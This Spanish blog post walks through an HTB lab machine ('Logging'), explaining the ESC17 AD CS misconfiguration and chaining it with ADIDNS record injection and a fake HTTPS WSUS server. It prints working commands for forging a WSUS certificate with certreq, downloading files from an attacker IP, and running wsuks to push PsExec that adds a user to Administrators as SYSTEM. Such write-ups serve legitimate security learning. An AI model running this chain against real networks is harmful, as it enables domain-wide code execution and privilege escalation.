---
title: Comprometiendo clientes WSUS mediante ADCS y DNS Zone Abuse
description: Secuestrando clientes WSUS mediante certificados falsos y envenenamiento DNS.
pubDate: 2026-05-01T04:00:00.000Z
heroImage: ../../assets/wsus4.png
category: Blog
draft: false
tags:
  - WSUS
  - ADCS
  - DNS_Zone
  - DNS
---
Antes de entrar de lleno a la parte práctica y los comandos, es vital asentar las bases teóricas. A menudo, en el mundo del *Red Teaming*, nos encontramos con vulnerabilidades que nacen no de un error de código, sino de una mitigación humana mal implementada. Este es el caso de **ESC17**. 

Para entender cómo llegamos aquí, primero debemos aclarar algunos conceptos clave sobre la infraestructura de Microsoft. 
## ¿Qué significa "ESC"? 

La denominación **ESC** hace referencia a vulnerabilidades enfocadas exclusivamente en abusar de **AD CS** (Active Directory Certificate Services). El número que le sigue (ESC1, ESC8, ESC17, etc.) es simplemente una convención creada por investigadores de ciberseguridad para catalogar estas técnicas en orden de descubrimiento. 
El servidor AD CS actúa como la "oficina de pasaportes" de una red corporativa: emite certificados digitales que los usuarios y las máquinas utilizan para autenticarse, cifrar tráfico o firmar código.
## El Rol de WSUS en la Red 

Por otro lado, tenemos a **WSUS** (Windows Server Update Services). Este es un servicio vital para el ahorro de ancho de banda en cualquier infraestructura corporativa. Su función es permitir a los administradores de TI descargar actualizaciones desde los servidores de Microsoft una sola vez y distribuirlas automáticamente a todos los *endpoints* del dominio, en lugar de que cada máquina lo haga individualmente saturando la red. 

Históricamente, el servicio de WSUS funcionaba por **HTTP** en texto plano. Esto era un problema enorme de seguridad: permitía a los atacantes en la red local realizar un ataque *Machine-in-the-Middle* (MITM) e inyectar actualizaciones maliciosas que se ejecutaban con los máximos privilegios del sistema (`NT AUTHORITY\SYSTEM`). Para evitar esto, la industria recomendó la mitigación lógica: **migrar WSUS a HTTPS** para cifrar el tráfico y validar la identidad del servidor. 
## El Origen de ESC17: Una mitigación a medias 

Aquí es donde la historia se pone interesante y donde entra la vulnerabilidad **ESC17**, detallada recientemente por investigadores de la firma *Digitrace* con el post [Using ADCS to Attack HTTPS-Enabled WSUS Clients](https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/)(basándose en el trabajo de Austin Coontz). 
ESC17 aparece de manera curiosa como consecuencia de una mala solución a una vulnerabilidad famosa anterior: **ESC1**. Cuando se descubrió ESC1, los administradores de sistemas corrieron a mitigarla. Eliminaron de sus plantillas de certificados de AD CS los permisos críticos (los EKU de *Client Authentication*), ya que estos permitían a los atacantes iniciar sesión como Administradores de Dominio. 

Sin embargo, dejaron intactos los permisos de **Autenticación de Servidor** (*Server Authentication*), asumiendo que eran inofensivos porque "solo sirven para levantar páginas web internas con HTTPS". **Grave error.** 

ESC17 demuestra que un atacante puede abusar de esa plantilla "parcheada" para emitir un certificado falso de servidor, romper la confianza del canal HTTPS de WSUS y comprometer las máquinas de la red. Si el certificado proviene del AD CS legítimo de la empresa, las computadoras confiarán ciegamente en él.

## El eslabón perdido: ADIDNS (DNS Zone Abuse) 

Los enfoques iniciales para explotar esta falla dependían de hacer *ARP Spoofing* para interceptar el tráfico. La limitación técnica de esto es que requería que el atacante y la víctima estuvieran en el mismo segmento de red (Capa 2). Aquí entra el vector documentado por *Mustafa Durukan* [ESC17: From ADCS Misconfiguration to WSUS Client Compromise via DNS Zone Abuse | Mustafa Durukan](https://mustafanafizdurukan.github.io/posts/esc17-wsus-dns-abuse/). 

En un entorno de Active Directory, la zona DNS integrada (ADIDNS) permite, por defecto, que *cualquier usuario autenticado* cree nuevos registros DNS. Si un atacante inyecta un registro (o un comodín `*`) apuntando desde el FQDN del servidor WSUS hacia la IP de su máquina atacante, el tráfico de *todos* los clientes del dominio será redirigido hacia él de forma nativa, saltándose la restricción de subredes.

## Prueba de concepto

Durante mi estadía en la season 10 de HTB, resolví una maquina llamada Logging de nivel medium basada en Active Directory en la cual consiste en diferentes vulnerabilidades en cadena.

Usaremos como referencia la parte de Privilegue Escalation como PoC debido a que tiene mucha relación con los blogs mencionados al inicio y que además existe una variante en la cual cambia un poco la metodología que menciona los blogs anteriores.

Sin duda esto es un leak de la maquina pero si profundizas y aprendes la metodologia no habrás perdido tu tiempo en solo copiar y pegar.

## Punto de partida

Dentro de lo necesario para ejecutar la PoC tenemos:

- Acceso con el usuario jaylee.clifton
- WSUS interno
- Template de Certificado Vulnerable ESC17
- Zona DNS integrado con AD

Nos autenticamos con jaylee.clifton mediante evil-winrm 

![](images_dns/Pasted%20image%2020260507170326.png)

El punto de partida de nuestra cadena de explotación no requiere privilegios elevados. Tras comprometer las credenciales del usuario `jaylee.clifton`, establecemos una sesión remota a través de WinRM.

**El concepto clave:** En un entorno Active Directory, cualquier usuario autenticado del dominio (como Jaylee) posee por defecto permisos suficientes de lectura sobre LDAP. Esto nos permite enumerar políticas, leer configuraciones del dominio y, lo más importante para nuestro ataque, comunicarnos con la Autoridad Certificadora (CA) para solicitar certificados. No necesitamos ser administradores locales para iniciar la fase de reconocimiento.

## Revisamos el servidor WSUS en la maquina

![](images_dns/Pasted%20image%2020260511203858.png)

Antes de lanzar cualquier ataque a ciegas, necesitamos entender cómo se actualiza esta máquina. Consultando las claves del registro local (`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate`), confirmamos que la infraestructura está utilizando una política de grupo (GPO) para forzar las actualizaciones a través de un servidor WSUS interno corporativo.

El valor `WUServer` nos revela dos datos críticos para nuestro objetivo:

1. La máquina confía en `wsus.logging.htb`
2. La comunicación se realiza de forma segura mediante `HTTPS` por el puerto `8531`

Esto nos indica que un simple ataque de _Man-in-the-Middle_ (MitM) en texto plano no funcionará. Si queremos interceptar este tráfico y entregar una actualización maliciosa, necesitaremos obligatoriamente un certificado TLS/SSL válido y firmado por el dominio para `wsus.logging.htb`.

## Certificado Vulnerable

![](images_dns/Pasted%20image%2020260511214418.png)

Con el objetivo claro, utilizamos herramientas como `certipy` para buscar fisuras en los Active Directory Certificate Services (AD CS). Identificamos una plantilla llamada `UpdateSrv` que presenta una configuración letal, la cual se alinea con la vulnerabilidad clasificada como **ESC17**.

Los pilares de esta vulnerabilidad son:

- **`Enrollee Supplies Subject : True`**: Este es el fallo fundamental (similar a ESC1). Nos permite definir a nuestra conveniencia el nombre alternativo (SAN) al momento de solicitar el certificado. Gracias a esto, podemos pedirle a la CA que nos firme un certificado diciendo que somos `wsus.logging.htb`.

- **`Extended Key Usage : Server Authentication`**: A diferencia de un ESC1 tradicional donde buscaríamos el EKU de _Client Authentication_ para iniciar sesión como un Domain Admin, este EKU nos permite autenticar _servicios_. Es exactamente lo que necesitamos para levantar nuestro servidor web falso, cifrar el tráfico HTTPS y hacer que la máquina víctima confíe en que se está conectando al WSUS legítimo.


## Fabricando el Pasaporte: "Generación de la solicitud (CSR)"

Una vez identificada la vulnerabilidad **ESC17** en la plantilla `UpdateSrv`, comprobamos que la Autoridad Certificadora (CA) tenía la configuración `Enrollee Supplies Subject : True`. Esto significaba que la CA firmaría cualquier nombre que le pidiéramos.

Sin embargo, para explotar esto de forma limpia, no podíamos enviar una petición estándar; necesitábamos "llenar el formulario" a nuestra conveniencia antes de enviarlo. Aquí es donde entra en juego el script criptográfico de la imagen: `build_wsus_csr.py`.

![](images_dns/Pasted%20image%2020260511220943.png)

Este script se encarga de preparar las dos piezas fundamentales de nuestro ataque MitM, ejecutándose de forma estrictamente local en nuestra máquina atacante:

- **La Llave Privada (`wsus_key.pem`):** Genera una llave RSA secreta. Esta llave será vital en la fase final, ya que nuestro servidor falso (`wsuks`) la necesitará para descifrar el tráfico HTTPS que reciba de la máquina víctima.

- **El CSR Malicioso (`req.csr`):** Construye el _Certificate Signing Request_. La magia de `build_wsus_csr.py` radica en que inyecta explícitamente el valor `wsus.logging.htb` dentro de los campos _Common Name_ (CN) y _Subject Alternative Name_ (SAN) de la solicitud.

Básicamente, este script es nuestra fábrica de identidades falsas. Al finalizar su ejecución, ya tenemos en nuestro poder el documento criptográfico (`req.csr`) perfectamente forjado, listo para ser entregado a la CA del dominio para que le ponga su sello oficial de confianza.

## Solicitando el certificado con herramientas nativas (certreq)

Ya tenemos nuestro archivo `req.csr` forjado en nuestro Kali, pero necesitamos enviárselo a la Autoridad Certificadora (CA) del dominio. Para hacer la explotación más sigilosa y evitar problemas de red desde afuera, decidimos ejecutar la solicitud directamente desde la máquina de la víctima usando binarios legítimos de Windows (Living off the Land).

Ejecutamos esta fase en tres pasos exactos dentro de nuestra sesión WinRM con `jaylee.clifton`:

**Paso 1: Transferir el pasaporte falso**

 Levantamos un servidor HTTP temporal en nuestro Kali y usamos PowerShell para cargar el CSR malicioso directamente en la carpeta de documentos del usuario comprometido.



```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.90/req.csr','C:\\Users\\jaylee.clifton\\Documents\\req.csr')"
```


![419](images_dns/Pasted%20image%2020260511223731.png)


**Paso 2: El Ataque (Explotando ESC17)**


```powershell
certreq -f -submit -attrib "CertificateTemplate:UpdateSrv" -config "DC01.logging.htb\logging-DC01-CA" "C:\Users\jaylee.clifton\Documents\req.csr" "C:\Users\jaylee.clifton\Documents\cert.cer"
```


![](images_dns/Pasted%20image%2020260512000132.png)

Aquí ocurre la magia. Usamos `certreq.exe`, la herramienta nativa de Microsoft para administrar certificados. Le indicamos explícitamente que utilice la plantilla vulnerable (`CertificateTemplate:UpdateSrv`) y lo apuntamos contra la CA del dominio. Como la plantilla tiene `Enrollee Supplies Subject : True` y Jaylee tiene permisos, la CA confía ciegamente en nuestro CSR y nos genera un certificado oficial para `wsus.logging.htb`.

**Paso 3: Extraer el certificado**

```powershell
download cert.cer
```

Finalmente, usamos el comando de descarga de Evil-WinRM para traernos el certificado firmado (`cert.cer`) de vuelta a nuestra máquina atacante.

El robo de identidad está completo. Ahora tenemos en nuestro Kali la llave privada (`wsus_key.pem` que generamos antes) y el certificado público oficial (`cert.cer`). Con estas dos piezas, cualquier servicio web que levantemos será reconocido como una conexión cifrada, segura y legítima por toda la infraestructura de Active Directory.

## Normalización criptográfica con OpenSSL

Con el certificado oficial (`cert.cer`) descargado de la máquina víctima y nuestra llave privada (`wsus_key.pem`) generada localmente, teníamos todas las piezas del rompecabezas. Sin embargo, para levantar nuestro servidor WSUS impostor en Linux, necesitábamos asegurarnos de que ambos archivos estuvieran en un formato estandarizado y emparejados correctamente.

Para evitar dolores de cabeza con el _parsing_ de certificados durante el ataque, utilizamos `openssl` para realizar una normalización en tres pasos:

**El Empaquetado (`.pfx`):** > Primero, fusionamos el certificado público y la llave privada en un único contenedor PKCS#12 (`wsus_srv.pfx`). Esto valida matemáticamente que la llave y el certificado se corresponden entre sí.

```bash
openssl pkcs12 -export -out wsus_srv.pfx -inkey wsus_key.pem -in cert.cer -passout pass:
```

**Extracción del Certificado Limpio:** Desde ese contenedor seguro, extraemos únicamente el certificado público (`wsus_srv_cert.pem`), garantizando que esté en un formato PEM perfectamente legible para herramientas en Python o Go.

```bash
openssl pkcs12 -in wsus_srv.pfx -out wsus_srv_cert.pem -clcerts -nokeys -passin pass:
```

**Extracción de la Llave Privada:** Finalmente, extraemos la llave privada (`wsus_srv_key.pem`). El detalle crucial aquí es el parámetro `-nodes` (No DES), el cual extrae la llave en texto plano, sin contraseña. Esto es obligatorio, ya que nuestro servidor falso necesitará leerla automáticamente al arrancar sin pedirnos un _prompt_ interactivo.

```bash
openssl pkcs12 -in wsus_srv.pfx -out wsus_srv_key.pem -nocerts -nodes -passin pass:
```

![](images_dns/Pasted%20image%2020260511230510.png)

## Secuestrando el DNS a través de LDAP (add_dns.py)

Ya teníamos el pasaporte falso listo (nuestros certificados `.pem`), pero la víctima seguía yendo al servidor de actualizaciones real. Necesitábamos desviar ese tráfico hacia nuestro Kali Linux. Para lograrlo, no atacamos el protocolo DNS frontalmente, sino que fuimos por la puerta trasera: el puerto **389 (LDAP)**.

Este script en Python (`add_dns.py`) es el corazón de la "traición". Veamos exactamente qué hace bajo el capó:

![697](images_dns/Pasted%20image%2020260511232213.png)


1. **La Estructura del Veneno:** Primero, tomamos nuestra IP de atacante (`10.10.14.96`) y usamos la librería `struct` para empaquetarla matemáticamente en el formato binario exacto que Microsoft espera para un registro DNS tipo "A".

2. **Autenticación (Pass-The-Hash):** Nos conectamos directamente al Controlador de Dominio por LDAP (puerto 389). En este caso, utilizamos el hash NTLM de la cuenta de servicio `msa_health$` que habíamos comprometido previamente. Esto demuestra que la vulnerabilidad puede ser explotada abusando de cuentas de máquina o servicio, sin requerir una cuenta de usuario tradicional.

3. **La Inyección y el Bypass (La Traición):** Aquí está la vulnerabilidad arquitectónica. Le enviamos a LDAP un comando `c.add` para crear un nuevo registro en la zona DNS integrada (`DC=DomainDnsZones`). Lo brillante de este paso es la clase de objeto que declaramos: `['top', 'dnsNode']`. Si hubiéramos intentado crear una máquina falsa, el Active Directory nos habría bloqueado por la cuota del MAQ (_MachineAccountQuota_). Pero como le dijimos a LDAP que solo estábamos creando un "nodo DNS", nos dejó pasar las defensas sin problemas.

![](images_dns/Pasted%20image%2020260511233301.png)

**El Resultado (`'description': 'success'`):** En el milisegundo en que LDAP guardó este objeto malicioso en su base de datos, el servicio de DNS del dominio lo asumió como una verdad absoluta. A partir de este momento, cualquier máquina en la red que pregunte _"¿Cuál es la IP de wsus.logging.htb?"_ recibirá como respuesta oficial nuestra IP de Kali. ¡La trampa está puesta!

## El Golpe Final: "Levantando el WSUS impostor con wsuks"

Con el tráfico de red ya desviado hacia nuestro Kali Linux gracias al envenenamiento DNS, era el momento de levantar el servicio que interceptaría esas peticiones. Para esto, utilizamos **wsuks**, una herramienta ofensiva diseñada específicamente para ataques MitM contra WSUS.

Ejecutamos el servidor falso con el siguiente comando:

```bash
sudo wsuks --serve-only -I tun0 -t 10.129.28.13 --tls-cert wsus_combo.pem -e PsExec64.exe -c "/accepteula /s cmd.exe /c net localgroup Administrators jaylee.clifton /add"
```

_(Nota técnica: Para el parámetro `--tls-cert`, simplemente concatenamos la llave privada y el certificado público normalizados en el paso anterior dentro de un solo archivo `wsus_combo.pem`)._

![](images_dns/Pasted%20image%2020260511234525.png)


Desglosemos la anatomía de este comando, porque aquí reside la escalada de privilegios:

- **La Trampa (`--serve-only` y `--tls-cert`):** Levantamos un servidor web en el puerto 8531 (el puerto oficial de WSUS). Al cargar nuestro certificado forjado, cuando la víctima se conecte, la validación TLS será exitosa. La máquina creerá que está hablando con la infraestructura legítima de Microsoft/Corporativa.

- **El Caballo de Troya (`-e PsExec64.exe`):** Le indicamos a `wsuks` que, cuando la víctima pida una actualización, le entregue el binario de Sysinternals `PsExec64.exe` camuflado como un parche de seguridad legítimo (un KB).

- **La Ejecución (`-c "..."`):** Aquí está la magia. El servicio de Windows Update en la máquina víctima ejecuta las actualizaciones con el máximo nivel de privilegios: **NT AUTHORITY\SYSTEM**. Los argumentos que le pasamos obligan a PsExec a ejecutar un comando silencioso (`/s`) que añade a nuestro usuario base (`jaylee.clifton`) al grupo local de Administradores.

**El Resultado en Pantalla:** Como se observa en la consola, una vez que la víctima inicia su escaneo de actualizaciones (ya sea por tareas programadas o forzado manualmente por nosotros vía WinRM), vemos llover las peticiones POST SOAP (`/ClientWebService/client.asmx`). La víctima negocia con nuestro servidor, acepta el parche falso y finalmente vemos la petición GET descargando el ejecutable.

En ese instante, el comando se ejecuta como SYSTEM en segundo plano. La máquina Logging ha sido comprometida en su totalidad.

## Verificación de Privilegios y Captura de la Root Flag

Tras la ejecución silenciosa de nuestro payload a través del servidor WSUS impostor, el servicio de Windows Update hizo el trabajo sucio por nosotros. Al confiar ciegamente en nuestro certificado forjado, ejecutó el comando de PsExec con el máximo nivel de privilegios: `NT AUTHORITY\SYSTEM`.

El último paso de nuestra cadena ofensiva (Post-Explotación) consiste en validar nuestro acceso desde la sesión inicial de Evil-WinRM:

**1. Confirmación del PrivEsc:** Ejecutamos `net localgroup administrators` para auditar a los miembros del grupo de administradores locales del servidor. Como podemos observar en la salida de la consola, nuestra usuaria inicial de bajos privilegios, `jaylee.clifton`, ahora forma parte de la élite de la máquina. ¡La escalada fue un éxito rotundo! Además, esta enumeración nos revela que el usuario `toby.brynleigh` también es un administrador local.

![](images_dns/Pasted%20image%2020260511235601.png)

**2. Reclamando el Trofeo:** Al ser administradores locales, las restricciones del sistema de archivos (UAC/NTFS) ya no son un obstáculo para Jaylee. Podemos navegar libremente por los directorios privados de otros usuarios. Nos dirigimos directamente al escritorio de Toby (`C:\Users\toby.brynleigh\Desktop\`) y listamos el contenido. Ahí está esperándonos el objetivo final: **la flag de root (`root.txt`)**.

![](images_dns/Pasted%20image%2020260511235616.png)

Hemos completado el ciclo de intrusión completo. Demostramos cómo la confianza rota de una Autoridad Certificadora (ESC17), combinada con el envenenamiento de zonas DNS integradas en LDAP, puede convertir el mecanismo de defensa más crítico de Windows (sus actualizaciones) en el arma perfecta para comprometer totalmente un servidor.

